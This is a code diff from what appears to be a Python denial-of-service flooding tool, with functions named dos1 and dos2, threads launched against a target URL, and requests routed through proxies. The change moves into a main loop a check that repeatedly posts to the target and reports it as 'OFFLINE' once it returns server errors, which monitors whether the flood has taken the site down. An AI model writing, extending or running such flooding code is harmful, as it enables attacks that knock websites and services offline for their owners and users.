@@ -113,12 +113,6 @@ def dos1(target):
         except:
             pass
         
-        checksite = requests.post(target, proxies=proxieshttphttp)
-        if checksite.status_code >= 500:
-            statustext = "OFFLINE"
-        elif checksite.status_code >= 200:
-            statustext = "ONLINE"
-        print("\r Check Site | Status: ", checksite.status_code, " | ", statustext, end='')
 
 def dos2(target):
     while True:
@@ -170,3 +164,11 @@ else:
         thr2 = threading.Thread(target=dospause2, args=(bar, url, ))
         thr2.start()
 print(colorama.Fore.GREEN + "All threads are running! \n")
+
+while True:
+    checksite = requests.post(target, proxies=proxieshttphttp)
+    if checksite.status_code >= 500:
+        statustext = "OFFLINE"
+    elif checksite.status_code >= 200:
+        statustext = "ONLINE"
+    print("\r Check Site | Status: ", checksite.status_code, " | ", statustext, end='')
